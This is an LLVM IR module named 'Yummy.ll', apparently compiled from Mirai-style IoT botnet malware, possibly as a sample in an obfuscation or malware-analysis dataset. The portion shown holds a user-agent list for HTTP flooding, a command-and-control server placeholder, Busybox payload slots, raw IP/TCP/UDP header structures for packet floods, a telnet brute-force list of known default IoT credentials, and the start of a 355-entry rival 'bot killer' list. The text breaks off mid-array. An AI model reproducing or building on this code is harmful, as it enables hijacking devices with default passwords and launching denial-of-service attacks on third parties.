; ModuleID = 'host/ir_fla/Yummy.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.58, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.3 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.7 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.8 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.9 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.10 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.11 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.12 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.13 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.14 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.16 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.17 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.18 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.19 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.20 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.21 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.23 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.24 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.25 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.26 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.27 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.28 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.30 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.31 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.32 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.35 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.36 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.37 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.39 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.40 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.41 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.42 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.43 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.44 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.45 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.46 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.47 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.48 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.51 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.52 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.53 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.54 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.58 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.59, i32 0, i32 0)], align 8
@.str.59 = private unnamed_addr constant [11 x i8] c"IP:BOTPORT\00", align 1
@Busybox_Payload = global i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), align 8
@.str.60 = private unnamed_addr constant [11 x i8] c"BB PAYLOAD\00", align 1
@Payload = global i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i32 0, i32 0), align 8
@.str.61 = private unnamed_addr constant [8 x i8] c"PAYLOAD\00", align 1
@Telnet_Usernames = global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0)], align 16
@.str.62 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.64 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@Telnet_Passwords = global [19 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0)], align 16
@.str.68 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.69 = private unnamed_addr constant [10 x i8] c"S2fGqNFs\00\00", align 1
@.str.70 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.71 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.72 = private unnamed_addr constant [10 x i8] c"hunt5759\00\00", align 1
@.str.73 = private unnamed_addr constant [10 x i8] c"OxhlwSG8\00\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.75 = private unnamed_addr constant [14 x i8] c"7ujMko0admin\00\00", align 1
@.str.76 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@Mirai_Usernames = global [1 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 8
@Mirai_Passwords = global [1 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)], align 8
@Bot_Killer_Binarys = global [355 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.160, i32 0, i32 0), 